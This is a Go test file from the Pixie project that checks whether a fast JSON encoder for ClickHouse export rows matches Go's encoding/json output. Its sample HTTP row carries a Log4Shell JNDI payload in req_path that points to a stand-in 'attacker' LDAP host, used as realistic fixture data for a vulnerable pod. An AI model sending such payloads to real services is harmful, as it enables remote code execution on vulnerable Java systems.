// Copyright 2018- The Pixie Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package sink

import (
	"bytes"
	"encoding/json"
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"

	"px.dev/pixie/src/vizier/services/adaptive_export/internal/clickhouse"
)

// The fast encoder must produce byte-equivalent JSON to encoding/json
// up to map-key ordering (which CH doesn't care about — JSONEachRow
// is order-agnostic). Round-trip every per-table row shape through
// both encoders and require the PARSED maps are equal.

func encodeViaJSON(rows []map[string]any) []byte {
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false)
	for _, r := range rows {
		obj := make(map[string]any, len(r))
		for k, v := range r {
			obj[k] = normalisePixieValue(v)
		}
		_ = enc.Encode(obj)
	}
	return buf.Bytes()
}

func parseNDJSON(b []byte) []map[string]any {
	var out []map[string]any
	for _, line := range bytes.Split(bytes.TrimRight(b, "\n"), []byte("\n")) {
		if len(line) == 0 {
			continue
		}
		var m map[string]any
		_ = json.Unmarshal(line, &m)
		out = append(out, m)
	}
	return out
}

func sampleHTTPRow(i int) map[string]any {
	return map[string]any{
		"time_":          time.Unix(0, int64(1_700_000_000_000_000_000+i)).UTC(),
		"upid":           "0000000100000000-00000000-0000000000000042",
		"namespace":      "log4j-poc",
		"pod":            "backend-vulnerable-779cd9d765-mxr8t",
		"remote_addr":    "10.0.0.45",
		"remote_port":    int64(54321),
		"local_addr":     "10.0.0.12",
		"local_port":     int64(8080),
		"trace_role":     int64(2),
		"encrypted":      uint8(0),
		"major_version":  int64(1),
		"minor_version":  int64(1),
		"content_type":   int64(0),
		"req_headers":    `{"Content-Type":"application/json"}`,
		"req_method":     "POST",
		"req_path":       "/api/v1/${jndi:ldap://attacker/Payload}",
		"req_body":       `{"id":42}`,
		"req_body_size":  int64(9),
		"resp_headers":   `{"Content-Type":"application/json"}`,
		"resp_status":    int64(500),
		"resp_message":   "Internal Server Error",
		"resp_body":      `{"error":"NPE"}`,
		"resp_body_size": int64(16),
		"latency":        int64(123456789),
		"hostname":       "pixie-worker-node",
		"event_time":     time.Unix(0, int64(1_700_000_000_000_000_000+i)).UTC(),
	}
}

func TestFastEncode_EquivalentToEncodingJSON_HTTPEvents(t *testing.T) {
	rows := []map[string]any{sampleHTTPRow(1), sampleHTTPRow(2), sampleHTTPRow(3)}

	var fast bytes.Buffer
	if err := encodePixieRowsFast(&fast, "http_events", rows); err != nil {
		t.Fatalf("encodePixieRowsFast: %v", err)
	}
	slow := encodeViaJSON(rows)

	gotFast := parseNDJSON(fast.Bytes())
	gotSlow := parseNDJSON(slow)
	if !reflect.DeepEqual(gotFast, gotSlow) {
		t.Fatalf("fast vs slow JSON diverged after parse:\n fast=%v\n slow=%v", gotFast, gotSlow)
	}
}

// Cover every pixie table — fast encoder should never silently drop
// columns or differ from the slow path for any of them.
func TestFastEncode_EquivalentToEncodingJSON_AllPixieTables(t *testing.T) {
	for _, table := range clickhouse.PixieTables() {
		t.Run(table, func(t *testing.T) {
			cols, err := clickhouse.Columns(table)
			if err != nil {
				t.Fatalf("Columns(%q): %v", table, err)
			}
			// Synthesise one row matching the table's column shape.
			row := map[string]any{}
			for i, c := range cols {
				switch {
				case c == "time_" || c == "event_time":
					row[c] = time.Unix(0, int64(1_700_000_000_000_000_000+i)).UTC()
				case c == "encrypted" || c == "ssl":
					row[c] = uint8(0)
				case strings.Contains(c, "addr") || c == "pod" || c == "namespace" || c == "hostname" || c == "upid" || c == "comm":
					row[c] = "value-" + c
				case strings.HasSuffix(c, "_size") || strings.HasSuffix(c, "_count") ||
					strings.HasPrefix(c, "conn_") || strings.HasPrefix(c, "bytes_") ||
					strings.HasSuffix(c, "_port") || strings.HasSuffix(c, "_role") ||
					strings.HasSuffix(c, "_version") || strings.HasSuffix(c, "_family") ||
					c == "protocol" || c == "trace_role" || c == "content_type" ||
					c == "latency" || c == "resp_status" || c == "major_version" || c == "minor_version":
					row[c] = int64(int64(i) + 1)
				default:
					row[c] = "v" + c
				}
			}

			var fast bytes.Buffer
			if err := encodePixieRowsFast(&fast, table, []map[string]any{row}); err != nil {
				t.Fatalf("fast: %v", err)
			}
			slow := encodeViaJSON([]map[string]any{row})

			gotFast := parseNDJSON(fast.Bytes())
			gotSlow := parseNDJSON(slow)
			if !reflect.DeepEqual(gotFast, gotSlow) {
				t.Fatalf("%s fast vs slow diverged:\n fast=%v\n slow=%v",
					table, gotFast, gotSlow)
			}
		})
	}
}

// Unknown table → ErrUnknownTable so WritePixieRows falls back to the
// encoding/json path without erroring out.
func TestFastEncode_UnknownTable_FallsBack(t *testing.T) {
	var buf bytes.Buffer
	err := encodePixieRowsFast(&buf, "not_a_real_table",
		[]map[string]any{{"a": 1}})
	if !errors.Is(err, clickhouse.ErrUnknownTable) {
		t.Fatalf("expected ErrUnknownTable, got %v", err)
	}
}

// Unsupported value type → errFastEncodeUnsupported so WritePixieRows
// falls back to encoding/json instead of producing a broken row.
func TestFastEncode_UnsupportedType_FallsBack(t *testing.T) {
	type weirdType struct{ X int }
	var buf bytes.Buffer
	err := encodePixieRowsFast(&buf, "http_events",
		[]map[string]any{sampleHTTPRow(0), {"time_": weirdType{X: 1}}})
	if !errors.Is(err, errFastEncodeUnsupported) {
		t.Fatalf("expected errFastEncodeUnsupported, got %v", err)
	}
}

// event_time derivation — pxapi rows don't carry event_time, only time_.
// The fast encoder MUST emit event_time = time_ rather than skip the
// column (which would silently fall back to CH's epoch-0 default and
// land every row in partition 197001 — rig 6a25c85c regression, aeprod6
// silent-drop tail). This test is the T2 write-integrity guard
// dx-agent asked for on PR #47.
func TestFastEncode_EventTime_DerivedFromTime(t *testing.T) {
	// Realistic Pixie timestamp; trailing fractional nanos verify the
	// time.Time value is emitted verbatim through CH's DateTime64(9)
	// shape, which CH then truncates to DateTime64(3) on insert.
	pixieTS := time.Unix(0, 1_717_790_021_560_000_000).UTC()
	row := sampleHTTPRow(0)
	row["time_"] = pixieTS
	delete(row, "event_time") // pxapi result rows arrive WITHOUT event_time

	var buf bytes.Buffer
	if err := encodePixieRowsFast(&buf, "http_events", []map[string]any{row}); err != nil {
		t.Fatalf("encodePixieRowsFast: %v", err)
	}
	parsed := parseNDJSON(buf.Bytes())
	if len(parsed) != 1 {
		t.Fatalf("expected 1 row, got %d", len(parsed))
	}
	et, ok := parsed[0]["event_time"].(string)
	if !ok {
		t.Fatalf("event_time absent from encoded row: %v", parsed[0])
	}
	// The fast encoder formats time.Time as the CH DateTime64 string
	// shape "YYYY-MM-DD HH:MM:SS.NNNNNNNNN" (UTC, 9 fractional digits).
	// The exact serialised string the fast encoder produces for this UTC
	// time.Time. The pin is by value (not derivation) so a regression in
	// the time-string format also trips this test.
	want := "2024-06-07 19:53:41.560000000"
	if et != want {
		t.Fatalf("event_time = %q, want %q (must equal time_ verbatim, not epoch 0)", et, want)
	}
}

// event_time NOT derived when the source row already carries it — caller-
// supplied event_time wins. Belt-and-suspenders: if a future code path
// already filled it correctly, the derivation must not overwrite.
func TestFastEncode_EventTime_NotOverwritten(t *testing.T) {
	rowTS := time.Unix(0, 1_717_790_000_000_000_000).UTC()
	differentTS := time.Unix(0, 1_700_000_000_000_000_000).UTC()
	row := sampleHTTPRow(0)
	row["time_"] = rowTS
	row["event_time"] = differentTS // caller supplied; must be preserved

	var buf bytes.Buffer
	if err := encodePixieRowsFast(&buf, "http_events", []map[string]any{row}); err != nil {
		t.Fatal(err)
	}
	parsed := parseNDJSON(buf.Bytes())
	if et := parsed[0]["event_time"].(string); !strings.HasPrefix(et, "2023-11-14") {
		t.Fatalf("caller-supplied event_time was overwritten: got %q", et)
	}
}

// Special characters in string columns must JSON-escape the same way
// encoding/json does — otherwise CH would parse different bytes than
// the slow path produces. Tab, newline, quote, backslash, control,
// emoji.
func TestFastEncode_StringEscapesMatch(t *testing.T) {
	row := sampleHTTPRow(0)
	row["req_body"] = "tab\there\nnewline \"quoted\" back\\slash \x01ctl ☃ emoji 🚀"
	row["req_path"] = "/a/ÿ/utf8"

	var fast bytes.Buffer
	if err := encodePixieRowsFast(&fast, "http_events", []map[string]any{row}); err != nil {
		t.Fatal(err)
	}
	slow := encodeViaJSON([]map[string]any{row})

	gotFast := parseNDJSON(fast.Bytes())
	gotSlow := parseNDJSON(slow)
	if !reflect.DeepEqual(gotFast, gotSlow) {
		t.Fatalf("escape divergence:\n fast=%v\n slow=%v", gotFast, gotSlow)
	}
}
